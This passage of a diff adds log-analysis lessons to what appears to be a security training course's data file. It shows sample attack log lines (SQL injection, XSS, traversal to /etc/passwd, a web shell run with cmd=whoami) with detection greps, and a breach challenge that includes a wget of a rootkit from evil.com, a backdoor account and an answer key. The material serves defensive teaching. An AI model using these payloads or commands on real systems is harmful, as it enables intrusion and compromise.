+192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /user?id=1 UNION SELECT * FROM users-- HTTP/1.1" 500 ...
+\`\`\`
+
+**Indicators:**
+- Single quotes (')
+- SQL keywords: UNION, SELECT, INSERT, DROP
+- Comment characters: --, #, /*
+- OR 1=1 patterns
+
+### XSS Attempts
+\`\`\`
+192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 ...
+\`\`\`
+
+**Indicators:**
+- <script> tags
+- javascript: URLs
+- Event handlers: onerror, onload
+- URL-encoded versions: %3Cscript%3E
+
+### Directory Traversal
+\`\`\`
+192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /files/../../../etc/passwd HTTP/1.1" 200 ...
+\`\`\`
+
+**Indicators:**
+- ../ sequences
+- URL-encoded: %2e%2e%2f
+- Targeting sensitive files: /etc/passwd, /etc/shadow
+
+### Web Shell Access
+\`\`\`
+192.168.1.100 - - [11/Oct/2023:10:00:00] "POST /uploads/shell.php HTTP/1.1" 200 50
+192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 12
+\`\`\`
+
+**Indicators:**
+- POST to unusual .php files
+- GET with cmd, command, c parameters
+- Small response sizes (command output)
+- Requests to /uploads, /tmp, /temp directories
+
+### Scanner/Bot Activity
+\`\`\`
+192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /admin HTTP/1.1" 404
+192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /administrator HTTP/1.1" 404
+192.168.1.100 - - [11/Oct/2023:10:00:02] "GET /wp-admin HTTP/1.1" 404
+192.168.1.100 - - [11/Oct/2023:10:00:03] "GET /phpmyadmin HTTP/1.1" 404
+\`\`\`
+
+**Indicators:**
+- Rapid 404 sequences
+- Common admin paths
+- WordPress, Drupal, Joomla paths
+- Unusual User-Agents: curl, python-requests, nikto
+
+## Analysis Commands
+
+\`\`\`bash
+# Top IPs by request count
+awk '{print $1}' access.log | sort | uniq -c | sort -rn | head 20
+
+# Find potential SQL injection
+grep -E "(SELECT|UNION|INSERT|DROP|--|'|%27)" access.log
+
+# Find 404 scanners
+awk '$9 == 404 {print $1}' access.log | sort | uniq -c | sort -rn | head 20
+
+# Find POST requests (potential uploads/exploits)
+grep "POST" access.log | awk '{print $1, $7}' | sort | uniq -c | sort -rn
+
+# Find requests to common attack paths
+grep -E "(shell|cmd|exec|eval|upload|admin)" access.log
+
+# Analyze User-Agents
+awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn | head 20
+
+# Find large responses (possible data exfiltration)
+awk '$10 > 1000000 {print $1, $7, $10}' access.log
+\`\`\`
+
+## Suspicious User-Agents
+
+| User-Agent | Likely Tool |
+|------------|-------------|
+| sqlmap | SQL injection tool |
+| nikto | Web vulnerability scanner |
+| nmap | Port scanner |
+| python-requests | Scripted attacks |
+| curl | Command-line tool |
+| Googlebot (fake) | Impersonation |
+    `,
+    keyTakeaways: [
+      "Combined Log Format provides IP, URL, status, referrer, and User-Agent",
+      "404 storms indicate directory/file scanning",
+      "SQL injection shows as quotes and SQL keywords in URLs",
+      "Web shells have distinctive access patterns (cmd parameters)",
+      "Unusual User-Agents often indicate automated attacks"
+    ]
+  },
+  {
+    id: "3.5",
+    courseId: "log-analysis",
+    title: "Hands-On: Linux Log Analysis Challenge",
+    content: `
+# Hands-On: Linux Log Analysis Challenge
+
+Time to put your Linux log analysis skills to the test! Investigate this simulated breach using only log files.
+
+## Scenario
+
+A web server was compromised. The incident response team has provided you with logs. Your mission:
+
+1. Determine the initial access method
+2. Identify attacker activities
+3. Document all IOCs
+4. Reconstruct the attack timeline
+
+## Log Samples
+
+### auth.log (Authentication Events)
+
+\`\`\`
+Oct 11 08:00:15 webserver sshd[12301]: Failed password for root from 203.0.113.50 port 54321 ssh2
+Oct 11 08:00:16 webserver sshd[12302]: Failed password for root from 203.0.113.50 port 54322 ssh2
+Oct 11 08:00:17 webserver sshd[12303]: Failed password for root from 203.0.113.50 port 54323 ssh2
+... (500 more failed attempts from same IP)
+Oct 11 08:05:30 webserver sshd[12805]: Accepted password for root from 203.0.113.50 port 55001 ssh2
+Oct 11 08:05:30 webserver sshd[12805]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Oct 11 08:06:00 webserver useradd[12810]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash
+Oct 11 08:06:05 webserver usermod[12811]: add 'backdoor' to group 'sudo'
+Oct 11 08:10:00 webserver sudo: backdoor : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/rootkit.tar.gz
+\`\`\`
+
+### access.log (Web Server)
+
+\`\`\`
+Oct 11 07:30:00 203.0.113.50 - - "GET /admin HTTP/1.1" 404 162
+Oct 11 07:30:01 203.0.113.50 - - "GET /wp-admin HTTP/1.1" 404 162
+Oct 11 07:30:02 203.0.113.50 - - "GET /administrator HTTP/1.1" 404 162
+Oct 11 07:30:03 203.0.113.50 - - "GET /phpmyadmin HTTP/1.1" 200 4523
+Oct 11 07:31:00 203.0.113.50 - - "GET /phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd HTTP/1.1" 200 1847
+Oct 11 07:32:00 203.0.113.50 - - "POST /phpmyadmin/import.php HTTP/1.1" 200 523
+\`\`\`
+
+### syslog (System Events)
+
+\`\`\`
+Oct 11 08:06:30 webserver systemd[1]: Started backdoor.service.
+Oct 11 08:06:31 webserver kernel: [UFW ALLOW] IN=eth0 OUT= SRC=203.0.113.50 DST=10.0.0.5 PROTO=TCP SPT=55001 DPT=22
+Oct 11 08:08:00 webserver CRON[12850]: (root) CMD (/tmp/.hidden/persist.sh)
+Oct 11 08:10:30 webserver kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.5 DST=45.33.32.156 PROTO=TCP SPT=45678 DPT=443
+\`\`\`
+
+### cron log
+
+\`\`\`
+Oct 11 08:07:00 webserver crontab[12840]: (root) REPLACE (root)
+Oct 11 08:07:00 webserver crontab[12840]: (root) LIST (root)
+\`\`\`
+
+## Investigation Questions
+
+### Question 1: Reconnaissance
+What did the attacker do before attempting SSH access?
+
+**Answer:** _______________________
+
+### Question 2: Initial Access (Web)
+The attacker found an exposed service. What was it?
+
+**Answer:** _______________________
+
+### Question 3: Vulnerability Exploited
+What type of attack was used against phpMyAdmin?
+
+**Answer:** _______________________
+
+### Question 4: Initial Access (SSH)
+How did the attacker gain SSH access?
+
+**Answer:** _______________________
+
+### Question 5: Persistence Mechanism 1
+What user account was created for persistence?
+
+**Answer:** _______________________
+
+### Question 6: Persistence Mechanism 2
+What service was created?
+
+**Answer:** _______________________
+
+### Question 7: Persistence Mechanism 3
+What cron job was added?
+
+**Answer:** _______________________
+
+### Question 8: C2 Communication
+What IP did the server connect to after compromise?
+
+**Answer:** _______________________
+
+### Question 9: Malware Downloaded
+What was the name of the malicious file downloaded?
+
+**Answer:** _______________________
+
+## Attack Timeline
+
+Fill in the timeline:
+
+\`\`\`
+07:30:00 ─── ___________________________
+    │
+07:30:03 ─── ___________________________
+    │
+07:31:00 ─── ___________________________
+    │
+08:00:15 ─── ___________________________
+    │
+08:05:30 ─── ___________________________
+    │
+08:06:00 ─── ___________________________
+    │
+08:06:30 ─── ___________________________
+    │
+08:07:00 ─── ___________________________
+    │
+08:08:00 ─── ___________________________
+    │
+08:10:00 ─── ___________________________
+    │
+08:10:30 ─── ___________________________
+\`\`\`
+
+## IOC Extraction
+
+Document all IOCs:
+
+**IP Addresses:**
+- ___________________________
+- ___________________________
+
+**URLs/Domains:**
+- ___________________________
+- ___________________________
+
+**File Paths:**
+- ___________________________
+- ___________________________
+
+**User Accounts:**
+- ___________________________
+
+**Services:**
+- ___________________________
+
+---
+
+## Answers
+
+1. Web application scanning (404 attempts on /admin, /wp-admin, etc.)
+2. phpMyAdmin
+3. Path/Directory traversal
+4. SSH brute force (500+ failed attempts, then success)
+5. "backdoor"
+6. backdoor.service
+7. /tmp/.hidden/persist.sh
+8. 45.33.32.156
+9. rootkit.tar.gz
+
+**Timeline:**
+\`\`\`
+07:30:00 ─── Web scanning begins
+07:30:03 ─── phpMyAdmin found (200 response)
+07:31:00 ─── Directory traversal exploit
+08:00:15 ─── SSH brute force begins
+08:05:30 ─── SSH access gained (root)
+08:06:00 ─── Backdoor user created, added to sudo
+08:06:30 ─── Malicious service started
+08:07:00 ─── Cron job modified
+08:08:00 ─── Persistence script runs
+08:10:00 ─── Malware downloaded
+08:10:30 ─── C2 connection established
+\`\`\`
+
+**IOCs:**
+- IPs: 203.0.113.50 (attacker), 45.33.32.156 (C2)
+- URLs: http://evil.com/rootkit.tar.gz
+- Paths: /tmp/.hidden/persist.sh
+- Users: backdoor
+- Services: backdoor.service
+    `,
+    keyTakeaways: [
+      "Correlate logs across auth, web, and system sources for full visibility",
+      "Attackers often perform reconnaissance before exploitation",
+      "Multiple persistence mechanisms are common (user, service, cron)",
+      "Timeline reconstruction reveals the attack sequence",
+      "IOC extraction is critical for blocking and hunting"
+    ],
+    practicalExercise: {
+      title: "Write the Incident Report",
+      description: "Create a formal incident report from this investigation.",
+      steps: [
+        "Write an executive summary",
+        "Document the attack chain (MITRE ATT&CK mapping)",
+        "List all IOCs with context",
+        "Provide remediation steps",
+        "Suggest detection improvements"
+      ]
+    }
   }
 ];
 
